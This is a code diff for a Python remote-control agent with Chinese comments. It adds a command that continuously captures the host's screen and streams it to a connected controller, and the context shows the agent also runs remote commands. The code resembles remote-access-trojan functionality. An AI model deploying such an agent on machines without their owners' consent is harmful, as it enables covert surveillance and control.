@@ -3,6 +3,8 @@ import pyautogui
 import psutil
 from threading import Thread
 import os
+import io
+from PIL import Image
 from tkinter import messagebox
 import shutil
 import time
@@ -133,6 +135,29 @@ def handle_connection(conn, addr):
             # 版本检查
             if data == "/version":
                 conn.sendall(VERSION.encode('utf-8'))
+                continue
+
+            # 屏幕传输协议
+            if data == "SCREEN:START":
+                conn.sendall("[OK] 开始屏幕传输".encode('utf-8'))
+                while True:
+                    try:
+                        # 捕获屏幕并压缩为JPEG
+                        img = pyautogui.screenshot()
+                        img_byte_arr = io.BytesIO()
+                        img.save(img_byte_arr, format='JPEG', quality=30)  # 调整quality控制画质
+                        img_data = img_byte_arr.getvalue()
+                        
+                        # 发送数据长度（4字节）和数据内容
+                        conn.sendall(len(img_data).to_bytes(4, 'big'))
+                        conn.sendall(img_data)
+                        
+                        # 接收控制端是否继续的确认信号
+                        if conn.recv(2) != b"GO":
+                            break
+                    except Exception as e:
+                        print(f"屏幕传输错误: {str(e)}")
+                        break
                 continue
 
             # 处理CMD命令
@@ -370,4 +395,5 @@ def target_main():
 
 if __name__ == "__main__":
     pyautogui.FAILSAFE = False
+    print("[OK] 启动控制端")
     target_main()
